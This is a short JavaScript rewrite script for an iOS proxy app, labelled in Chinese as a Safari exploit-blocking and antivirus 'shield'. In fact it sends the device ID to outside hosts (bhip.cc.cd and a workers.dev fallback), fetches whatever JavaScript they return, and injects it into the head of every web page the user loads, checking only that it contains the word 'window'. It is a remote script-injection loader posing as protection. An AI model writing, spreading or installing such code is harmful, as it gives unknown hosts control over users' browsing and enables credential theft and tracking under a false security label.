/**
 * Safari漏洞封堵&病毒防范脚本 (云端验证 Version)
 * 作者：fiywind
 */

const ua = $request.headers['User-Agent'] || $request.headers['user-agent'];
const did = $environment.device_id;
const urls = [
    `https://bhip.cc.cd/?id=${did}`, 
    `https://safari-shield-auth.justlcd.workers.dev/?id=${did}`
];

// 精准识别逻辑
if (ua && (ua.includes("Safari") || ua.includes("iPhone")) && $response.body && $response.body.includes("<head>")) {
    fetchShield(0);
} else {
    $done({});
}

function fetchShield(idx) {
    if (idx >= urls.length) return $done({}); 

    $httpClient.get(urls[idx], (err, resp, data) => {
        // 校验：确保返回的是有效的 window 代码逻辑
        if (!err && resp.status === 200 && data.includes("window")) {
            let body = $response.body.replace("<head>", `<head><script>${data}</script>`);
            console.log("🛡️ Shield Activated via " + urls[idx]);
            $done({ body });
        } else {
            // 第一域名失效则尝试备用
            fetchShield(idx + 1); 
        }
    });
}
